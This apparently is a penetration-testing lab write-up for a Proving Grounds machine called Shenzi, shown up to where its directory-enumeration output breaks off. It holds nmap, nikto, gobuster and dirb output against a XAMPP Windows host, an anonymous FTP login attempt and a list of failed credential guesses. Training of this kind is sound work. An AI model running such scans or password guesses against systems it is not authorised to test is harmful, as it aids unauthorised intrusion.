# Shenzi

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Mon Jan 24 09:35:48 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Shenzi/results/192.168.234.55/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Shenzi/results/192.168.234.55/scans/xml/_full_tcp_nmap.xml" 192.168.234.55
adjust_timeouts2: packet supposedly had rtt of -421097 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -421097 microseconds.  Ignoring time.
Nmap scan report for 192.168.234.55
Host is up, received user-set (0.23s latency).
Scanned at 2022-01-24 09:35:49 EST for 802s
Not shown: 65526 filtered ports
Reason: 65526 no-responses
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.234.55/dashboard/
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.234.55/dashboard/
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds? syn-ack ttl 127
3306/tcp open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NULL, TLS-PSK: 
|_    Host '192.168.49.234' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.234' is not allowed to connect to this MariaDB server
5040/tcp open  unknown       syn-ack ttl 127
7680/tcp open  pando-pub?    syn-ack ttl 127
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=9%D=1/24%Time=61EEBA0D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.234'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLS-PSK,4
SF:D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.234'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (88%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/24%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61EEBC67%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10B%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61238/tcp): CLEAN (Timeout)
|   Check 2 (port 34667/tcp): CLEAN (Timeout)
|   Check 3 (port 8032/udp): CLEAN (Timeout)
|   Check 4 (port 53353/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-24T14:48:28
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   246.99 ms 192.168.49.1
2   248.57 ms 192.168.234.55

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 24 09:49:11 2022 -- 1 IP address (1 host up) scanned in 802.87 seconds

```

### Vuln

```
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ nmap -p 21,80,135,139,443,445,3306,5040,7680 192.168.234.55 --script vuln -v                                                                              130 ⨯ 1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 10:04 EST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:04
Completed NSE at 10:04, 10.02s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating Ping Scan at 10:04
Scanning 192.168.234.55 [2 ports]
Completed Ping Scan at 10:04, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:04
Completed Parallel DNS resolution of 1 host. at 10:04, 0.02s elapsed
Initiating Connect Scan at 10:04
Scanning 192.168.234.55 [9 ports]
Discovered open port 135/tcp on 192.168.234.55
Discovered open port 445/tcp on 192.168.234.55
Discovered open port 443/tcp on 192.168.234.55
Discovered open port 139/tcp on 192.168.234.55
Discovered open port 80/tcp on 192.168.234.55
Discovered open port 3306/tcp on 192.168.234.55
Discovered open port 21/tcp on 192.168.234.55
Discovered open port 5040/tcp on 192.168.234.55
Completed Connect Scan at 10:04, 1.96s elapsed (9 total ports)
NSE: Script scanning 192.168.234.55.
Initiating NSE at 10:04
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 10:10, 315.47s elapsed
Initiating NSE at 10:10
Completed NSE at 10:10, 2.68s elapsed
Nmap scan report for 192.168.234.55
Host is up (0.25s latency).

PORT     STATE    SERVICE
21/tcp   open     ftp
|_sslv2-drown: 
80/tcp   open     http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.43 (win64) openssl/1.1.1g php/7.4.6'
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.234.55:80/dashboard/javascripts/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.234.55:80/dashboard/javascripts/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.234.55:80/dashboard/javascripts/?C=N%3bO%3dD%27%20OR%20sqlspider
|_    http://192.168.234.55:80/dashboard/javascripts/?C=S%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
443/tcp  open     https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.43 (win64) openssl/1.1.1g php/7.4.6'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_sslv2-drown: 
445/tcp  open     microsoft-ds
3306/tcp open     mysql
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
5040/tcp open     unknown
7680/tcp filtered pando-pub

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

NSE: Script Post-scanning.
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
Initiating NSE at 10:10
Completed NSE at 10:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 330.78 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$   
```

## 21 - FTP

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.234.55 
Connected to 192.168.234.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.234.55:kali): anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> 

```

Failed Credentials
```
admin:admin
admin:password
guest:guest
backup:backup
admin:FeltHeadwallWight357
postmaster:postmaster
postmaster:FeltHeadwallWight357
```

## 80 - Web

```
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ gobuster dir -u http://192.168.234.55/dashboard/ -x html,php,js -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt                         1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.234.55/dashboard/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,js
[+] Timeout:                 10s
===============================================================
2022/01/24 10:13:14 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 351] [--> http://192.168.234.55/dashboard/images/]
/docs                 (Status: 301) [Size: 349] [--> http://192.168.234.55/dashboard/docs/]  
/de                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/de/]    
/fr                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/fr/]    
/es                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/es/]    
/404.html             (Status: 200) [Size: 4384]                                             
/Images               (Status: 301) [Size: 351] [--> http://192.168.234.55/dashboard/Images/]
/ru                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/ru/]    
/it                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/it/]    
/index.html           (Status: 200) [Size: 7576]                                             
/pl                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/pl/]    
/javascripts          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/javascripts/]
/stylesheets          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/stylesheets/]
/faq.html             (Status: 200) [Size: 31751]                                                 
/ro                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/ro/]         
/tr                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/tr/]         
/hu                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/hu/]         
/jp                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/jp/]         
/Docs                 (Status: 301) [Size: 349] [--> http://192.168.234.55/dashboard/Docs/]       
/DE                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/DE/]         
/IMAGES               (Status: 301) [Size: 351] [--> http://192.168.234.55/dashboard/IMAGES/]     
/IT                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/IT/]         
/FR                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/FR/]         
/ES                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/ES/]         
/FAQ.html             (Status: 200) [Size: 31751]                                                 
/howto.html           (Status: 200) [Size: 6021]                                                  
/StyleSheets          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/StyleSheets/]
/ur                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/ur/]         
/Stylesheets          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/Stylesheets/]
/JavaScripts          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/JavaScripts/]
/RU                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/RU/]         
/JP                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/JP/]         
/Index.html           (Status: 200) [Size: 7576]                                                  
/Javascripts          (Status: 301) [Size: 356] [--> http://192.168.234.55/dashboard/Javascripts/]
/con                  (Status: 403) [Size: 1046]                                                  
/con.html             (Status: 403) [Size: 1046]                                                  
/con.php              (Status: 403) [Size: 1046]                                                  
/con.js               (Status: 403) [Size: 1046]                                                  
/DOCS                 (Status: 301) [Size: 349] [--> http://192.168.234.55/dashboard/DOCS/]       
/PL                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/PL/]         
/phpinfo.php          (Status: 200) [Size: 78587]                                                 
/Faq.html             (Status: 200) [Size: 31751]                                                 
/TR                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/TR/]         
/pt_BR                (Status: 301) [Size: 350] [--> http://192.168.234.55/dashboard/pt_BR/]      
/aux.php              (Status: 403) [Size: 1046]                                                  
/aux.js               (Status: 403) [Size: 1046]                                                  
/aux                  (Status: 403) [Size: 1046]                                                  
/aux.html             (Status: 403) [Size: 1046]                                                  
/HU                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/HU/]         
/Fr                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/Fr/]         
/RO                   (Status: 301) [Size: 347] [--> http://192.168.234.55/dashboard/RO/]         
/zh_TW                (Status: 301) [Size: 350] [--> http://192.168.234.55/dashboard/zh_TW/]      
                                                                                                  
===============================================================
2022/01/24 10:49:02 Finished
===============================================================
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$             
```

![](Pasted%20image%2020220306141054.png)

![](Pasted%20image%2020220306134835.png)
 ![](Pasted%20image%2020220306135104.png)

 ![](Pasted%20image%2020220306135633.png)
 ![](Pasted%20image%2020220306135647.png)

### Nikto

```bash
┌──(kali㉿kali)-[~]
└─$ nikto -h http://192.168.168.55/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.168.55
+ Target Hostname:    192.168.168.55
+ Target Port:        80
+ Start Time:         2022-03-05 23:04:35 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+ Retrieved x-powered-by header: PHP/7.4.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://192.168.168.55/dashboard/
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-03-05 23:32:54 (GMT-5) (1699 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (PHP/7.4.6 Apache/2.4.43) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? 

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

### Dir enum

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.168.55                                        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  5 22:49:47 2022
URL_BASE: http://192.168.168.55/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.168.55/ ----
+ http://192.168.168.55/aux (CODE:403|SIZE:1046)                                                                                                                       
+ http://192.168.168.55/cgi-bin/ (CODE:403|SIZE:1060)                                                                                                                  
+ http://192.168.168.55/com1 (CODE:403|SIZE:1046)                                                                                                                      
+ http://192.168.168.55/com2 (CODE:403|SIZE:1046)                                                                                                                      
+ http://192.168.168.55/com3 (CODE:403|SIZE:1046)                                                                                                                      
+ http://192.168.168.55/con (CODE:403|SIZE:1046)                                                                                                                       
==> DIRECTORY: http://192.168.168.55/dashboard/                                                                                                                        
+ http://192.168.168.55/examples (CODE:503|SIZE:1060)                                                                                                                  
+ http://192.168.168.55/favicon.ico (CODE:200|SIZE:30894)                                                                                                              
==> DIRECTORY: http://192.168.168.55/img/                                                                                                                              
+ http://192.168.168.55/index.php (CODE:302|SIZE:0)                                                                                                                    
+ http://192.168.168.55/licenses (CODE:403|SIZE:1205)                                                                                                                  
+ http://192.168.168.55/lpt1 (CODE:403|SIZE:1046)                                                                                                                      
+ http://192.168.168.55/lpt2 (CODE:403|SIZE:1046)                                                                                                                      
+ http://192.168.168.55/nul (CODE:403|SIZE:1046)                                                                                                                       
+ http://192.168.168.55/phpmyadmin (CODE:403|SIZE:1205)                                                                                                                
+ http://192.168.168.55/prn (CODE:403|SIZE:1046)                                                                                                                       
+ http://192.168.168.55/server-info (CODE:403|SIZE:1205)                                                                                                               
+ http://192.168.168.55/server-status (CODE:403|SIZE:1205)                                                                                                             
+ http://192.168.168.55/webalizer (CODE:403|SIZE:1046)                                                                                                                 
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/ ----
+ http://192.168.168.55/dashboard/aux (CODE:403|SIZE:1046)                                                                                                             
+ http://192.168.168.55/dashboard/com1 (CODE:403|SIZE:1046)                                                                                                            
+ http://192.168.168.55/dashboard/com2 (CODE:403|SIZE:1046)                                                                                                            
+ http://192.168.168.55/dashboard/com3 (CODE:403|SIZE:1046)                                                                                                            
+ http://192.168.168.55/dashboard/con (CODE:403|SIZE:1046)                                                                                                             
==> DIRECTORY: http://192.168.168.55/dashboard/de/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/docs/                                                                                                                   
==> DIRECTORY: http://192.168.168.55/dashboard/es/                                                                                                                     
+ http://192.168.168.55/dashboard/favicon.ico (CODE:200|SIZE:1150)                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/fr/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/hu/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/images/                                                                                                                 
==> DIRECTORY: http://192.168.168.55/dashboard/Images/                                                                                                                 
+ http://192.168.168.55/dashboard/index.html (CODE:200|SIZE:7576)                                                                                                      
==> DIRECTORY: http://192.168.168.55/dashboard/it/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/javascripts/                                                                                                            
==> DIRECTORY: http://192.168.168.55/dashboard/jp/                                                                                                                     
+ http://192.168.168.55/dashboard/lpt1 (CODE:403|SIZE:1046)                                                                                                            
+ http://192.168.168.55/dashboard/lpt2 (CODE:403|SIZE:1046)                                                                                                            
+ http://192.168.168.55/dashboard/nul (CODE:403|SIZE:1046)                                                                                                             
+ http://192.168.168.55/dashboard/phpinfo.php (CODE:200|SIZE:78665)                                                                                                    
==> DIRECTORY: http://192.168.168.55/dashboard/pl/                                                                                                                     
+ http://192.168.168.55/dashboard/prn (CODE:403|SIZE:1046)                                                                                                             
==> DIRECTORY: http://192.168.168.55/dashboard/pt_BR/                                                                                                                  
==> DIRECTORY: http://192.168.168.55/dashboard/ro/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/ru/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/stylesheets/                                                                                                            
==> DIRECTORY: http://192.168.168.55/dashboard/tr/                                                                                                                     
==> DIRECTORY: http://192.168.168.55/dashboard/zh_CN/                                                                                                                  
==> DIRECTORY: http://192.168.168.55/dashboard/zh_TW/                                                                                                                  
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/de/ ----
+ http://192.168.168.55/dashboard/de/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/de/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/de/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/de/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/de/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/de/index.html (CODE:200|SIZE:7797)                                                                                                   
+ http://192.168.168.55/dashboard/de/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/de/lpt2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/de/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/de/prn (CODE:403|SIZE:1046)                                                                                                          
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/es/ ----
+ http://192.168.168.55/dashboard/es/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/es/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/es/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/es/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/es/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/es/index.html (CODE:200|SIZE:7681)                                                                                                   
+ http://192.168.168.55/dashboard/es/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/es/lpt2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/es/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/es/prn (CODE:403|SIZE:1046)                                                                                                          
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/fr/ ----
+ http://192.168.168.55/dashboard/fr/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/fr/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/fr/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/fr/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/fr/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/fr/index.html (CODE:200|SIZE:7772)                                                                                                   
+ http://192.168.168.55/dashboard/fr/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/fr/lpt2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/fr/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/fr/prn (CODE:403|SIZE:1046)                                                                                                          
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/hu/ ----
+ http://192.168.168.55/dashboard/hu/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/hu/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/hu/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/hu/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/hu/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/hu/index.html (CODE:200|SIZE:7824)                                                                                                   
+ http://192.168.168.55/dashboard/hu/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/hu/lpt2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/hu/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/hu/prn (CODE:403|SIZE:1046)                                                                                                          
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/it/ ----
+ http://192.168.168.55/dashboard/it/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/it/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/it/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/it/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/it/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/it/index.html (CODE:200|SIZE:7702)                                                                                                   
+ http://192.168.168.55/dashboard/it/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/it/lpt2 (CODE:403|SIZE:1046)                                                                                                         
